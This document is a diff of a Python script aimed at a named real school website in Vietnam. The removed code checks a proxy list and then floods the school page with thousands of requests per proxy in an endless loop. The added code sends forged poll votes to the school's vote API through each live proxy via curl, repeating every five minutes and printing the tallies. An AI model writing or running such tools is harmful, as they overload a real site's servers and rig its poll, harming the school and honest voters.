@@ -1,94 +1,158 @@
-import asyncio
-import aiohttp
+import requests, subprocess, time, concurrent.futures, json
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from rich.console import Console
+from rich.table import Table
 
 # ================== CONFIG ==================
-INPUT_FILE = "alive1.txt"      # initial list of proxies to test
-OUTPUT_FILE = "a.txt"          # alive proxies saved here
-TARGET_URL = "https://c3phucu.hungyen.edu.vn/tin-tuc/thoi-khoa-bieu-so-1-ca-chieu.html"
-TIMEOUT = 10
-CONNECTIONS_PER_PROXY = 1000   # hits per proxy per cycle
-MAX_CONCURRENT = 5000
+THREADS = 500
+INPUT_FILE = "proxy.txt"
+TARGET_PAGE = "https://c3phucu.hungyen.edu.vn/tin-tuc/thoi-khoa-bieu-so-1-ca-chieu.html"
+VOTE_API = "https://c3phucu.hungyen.edu.vn/api/vote/store"
+VOTE_VIEW_API = "https://c3phucu.hungyen.edu.vn/api/vote"
+DATA_FILE = "data.txt"
+TIMEOUT = 5
+VIEW_REFRESH = 300  # 5 phút
+HEADERS = [
+    "-H", "User-Agent: Mozilla/5.0",
+    "-H", "Accept: */*",
+    "-H", "X-Requested-With: XMLHttpRequest",
+    "-H", "Content-Type: multipart/form-data; boundary=----geckoformboundary94a1dddf2223cf22c83a97727ab2f4dc",
+    "-H", "Origin: https://c3phucu.hungyen.edu.vn",
+    "-H", "Referer: https://c3phucu.hungyen.edu.vn/",
+    "-H", "Cookie: XSRF-TOKEN=YOUR_XSRF_TOKEN; thpt_phu_cu_session=YOUR_SESSION_COOKIE",
+]
 # ============================================
 
+console = Console()
 
-def make_proxy_url(proxy: str) -> str:
+# ========== PHẦN 1: CHECK PROXY ==========
+def check_proxy(proxy: str) -> str | None:
     proxy = proxy.strip()
-    if proxy.startswith(("http://", "https://", "socks")):
-        return proxy
-    return f"http://{proxy}"
+    if not proxy:
+        return None
 
+    if proxy.startswith("socks4://") or proxy.startswith("socks5://"):
+        scheme = proxy.split("://")[0]
+        address = proxy.split("://")[1]
+        proxies = {scheme: f"{scheme}://{address}"}
+    else:
+        address = proxy.replace("http://", "").replace("https://", "")
+        proxies = {
+            "http": f"http://{address}",
+            "https": f"http://{address}",
+        }
 
-async def check_proxy(session: aiohttp.ClientSession, proxy: str) -> str | None:
-    """Check if proxy works once"""
     try:
-        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
-            if resp.status == 200:
-                print(f"[+] WORKING: {proxy}")
-                return proxy
-            else:
-                print(f"[-] DEAD: {proxy} (status {resp.status})")
-    except asyncio.TimeoutError:
-        print(f"[-] DEAD: {proxy} (timeout)")
-    except aiohttp.ClientProxyConnectionError:
-        print(f"[-] DEAD: {proxy} (proxy conn error)")
-    except aiohttp.ClientHttpProxyError:
-        print(f"[-] DEAD: {proxy} (http proxy error)")
-    except aiohttp.ClientSSLError:
-        print(f"[-] DEAD: {proxy} (SSL error)")
-    except Exception as e:
-        print(f"[-] DEAD: {proxy} ({type(e).__name__})")
+        r = requests.get(TARGET_PAGE, proxies=proxies, timeout=TIMEOUT, verify=False)
+        if r.status_code == 200:
+            console.print(f"[green][+] WORKING:[/green] {proxy}")
+            return proxy
+    except Exception:
+        pass
+    console.print(f"[red][-] DEAD:[/red] {proxy}")
     return None
 
-
-async def hammer_once(session: aiohttp.ClientSession, proxy: str):
-    """One request via proxy"""
-    try:
-        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
-            print(f"[+] EXTRA HIT via {proxy} ({resp.status})")
-    except Exception as e:
-        print(f"[!] Extra hit failed for {proxy} ({type(e).__name__})")
-
-
-async def hammer_forever(alive: list[str]):
-    """Infinite hammer loop for saved alive proxies"""
-    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
-
-    async with aiohttp.ClientSession(connector=connector) as session:
-        while True:
-            tasks = []
-            for proxy in alive:
-                for _ in range(CONNECTIONS_PER_PROXY):
-                    tasks.append(hammer_once(session, proxy))
-
-            # Fire off all hammer requests this round
-            await asyncio.gather(*tasks)
-
-
-async def main():
-    # === First run: check proxies ===
+def get_alive_proxies():
     with open(INPUT_FILE, "r", encoding="utf-8") as f:
         proxies = [line.strip() for line in f if line.strip()]
 
     alive = []
-    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
+        results = list(executor.map(check_proxy, proxies))
+    for result in results:
+        if result:
+            alive.append(result)
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [check_proxy(session, proxy) for proxy in proxies]
-        results = await asyncio.gather(*tasks)
-        alive = [p for p in results if p]
+    console.print(f"[bold cyan][!] {len(alive)} proxies sống[/bold cyan]")
+    return alive
 
-    # Save alive proxies
-    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
-        f.write("\n".join(alive))
+# ========== PHẦN 2: SPAM VOTE ==========
+def send_request(proxy: str):
+    cmd = [
+        "curl", VOTE_API,
+        "--proxy", proxy,
+        "--compressed",
+        "-X", "POST",
+        "--data-binary", f"@{DATA_FILE}"
+    ] + HEADERS
 
-    print(f"\n[!] {len(alive)} alive proxies saved to {OUTPUT_FILE}")
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+        if result.returncode == 0:
+            try:
+                resp = json.loads(result.stdout.strip())
+                if resp.get("message") == ["B\u00ecnh ch\u1ecdn th\u00e0nh c\u00f4ng !"]:
+                    return f"[green][+][/green] {proxy} ✅ success"
+                else:
+                    return f"[red][!][/red] {proxy} ❌ invalid response: {resp}"
+            except json.JSONDecodeError:
+                return f"[red][!][/red] {proxy} ❌ not JSON: {result.stdout.strip()}"
+        else:
+            return f"[red][!][/red] {proxy} ❌ failed (exit {result.returncode})"
+    except Exception as e:
+        return f"[red][!][/red] {proxy} ❌ error: {e}"
 
-    # === After first check: hammer only ===
-    if alive:
-        await hammer_forever(alive)
-    else:
-        print("[!] No alive proxies found. Exiting.")
+def spam_vote(alive):
+    if not alive:
+        console.print("[red][!] Không có proxy sống[/red]")
+        return
 
+    workers = min(100, len(alive))
+    console.print(f"[*] Bắn vote với {workers} threads 🧨")
+
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = {executor.submit(send_request, proxy): proxy for proxy in alive}
+        for future in as_completed(futures):
+            console.print(future.result())
+
+# ========== PHẦN 3: SHOW VOTE ==========
+def show_votes():
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "X-Requested-With": "XMLHttpRequest",
+        "Referer": TARGET_PAGE,
+    }
+
+    res = requests.get(VOTE_VIEW_API, headers=headers)
+    data = res.json()
+
+    for poll in data:
+        table = Table(title=f"📊 {poll['question']}", title_style="bold magenta")
+        table.add_column("Lựa chọn", style="cyan", no_wrap=True)
+        table.add_column("Số phiếu", justify="center", style="yellow")
+        table.add_column("Tổng phiếu", justify="center", style="yellow")
+        table.add_column("Tỉ lệ", justify="center", style="green")
+
+        for v in poll['votes']:
+            table.add_row(
+                v['answer'],
+                str(v['count']),
+                str(v['total']),
+                f"{v['percent']:.2f}%"
+            )
+        console.print(table)
+
+# ========== MAIN LOOP ==========
+def main():
+    while True:
+        console.rule("[bold magenta]🔍 Checking proxies")
+        alive = get_alive_proxies()
+
+        console.rule("[bold magenta]🚀 Spamming votes")
+        spam_vote(alive)
+        console.rule("[bold magenta]🚀 Spamming votes p.2")
+        spam_vote(alive)
+        console.rule("[bold magenta]🚀 Spamming votes p.3")
+        spam_vote(alive)
+        console.rule("[bold magenta]🚀 Spamming votes p.4")
+        spam_vote(alive)
+
+        console.rule("[bold magenta]📺 Showing results")
+        show_votes()
+
+        console.print(f"[blue]⏳ Đợi {VIEW_REFRESH/60:.0f} phút rồi chơi tiếp...[/blue]")
+        time.sleep(VIEW_REFRESH)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
